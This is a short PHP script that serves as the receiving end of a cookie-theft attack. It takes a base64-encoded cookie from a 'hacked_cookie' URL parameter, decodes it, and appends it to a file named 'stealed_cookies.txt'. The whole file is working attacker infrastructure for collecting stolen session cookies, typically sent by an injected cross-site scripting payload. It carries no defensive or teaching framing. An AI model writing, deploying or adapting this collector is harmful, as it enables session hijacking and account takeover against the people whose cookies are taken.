<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Make sure the GET param exists
if (isset($_GET['hacked_cookie'])) {
    $raw_cookie = $_GET['hacked_cookie'];
    $decoded_cookie = base64_decode($raw_cookie);

    // Write decoded cookie to file
    file_put_contents('stealed_cookies.txt', $decoded_cookie . "\n", FILE_APPEND | LOCK_EX);

    echo "Cookie received and saved.";
} else {
    echo "No hacked_cookie parameter received.";
}
?>
